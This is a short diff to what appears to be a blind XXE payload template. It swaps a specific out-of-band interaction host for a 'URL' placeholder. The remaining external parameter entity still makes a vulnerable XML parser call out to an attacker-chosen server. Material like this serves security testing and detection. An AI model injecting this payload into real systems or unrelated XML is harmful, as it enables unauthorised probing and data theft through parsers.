@@ -1,2 +1,2 @@
-<!ENTITY % oob SYSTEM "http://xxe-blind.dbsn8rllcf0rumuss69gfwk53z9xw3esn.oast.live/probe">
+<!ENTITY % oob SYSTEM "http://URL/probe">
 %oob;
